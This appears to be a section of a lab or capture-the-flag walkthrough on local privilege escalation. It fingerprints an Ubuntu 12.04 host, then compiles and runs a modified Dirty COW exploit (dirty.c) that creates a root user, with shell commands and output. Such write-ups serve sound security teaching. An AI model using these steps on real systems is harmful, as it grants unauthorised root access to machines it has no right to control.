# Dirty cow

Once we have a shell, we need to escalate our privileges.
To find exploits for our system we can run `lsb_release -a` to find what OS version we are currently running.
```
$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 12.04.5 LTS
Release:	12.04
Codename:	precise
```

A common exploit for older Linux systems is the Dirty Cow, nicely explained by Computerphile [here](https://www.youtube.com/watch?v=CQcgz43MEZg).
A list of these dirty copy-on-write exploits can be found [here](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs).

After trying many of them, we found [dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c) to be the simplest and most reliable.
We edited the exploit a bit so we can supply both the username and password on the command line.

The comments at the top of the file contain running instructions.
```shell
$ nano dirty.c
# Paste in the copied contents of scripts/dirty.c
# I change the username to 
$ gcc dirty.c -pthread -o dirty -lcrypt
$ ./dirty root42 pass
[...]
$ su root42

$ id
uid=0(peer) gid=0(root) groups=0(root)
```
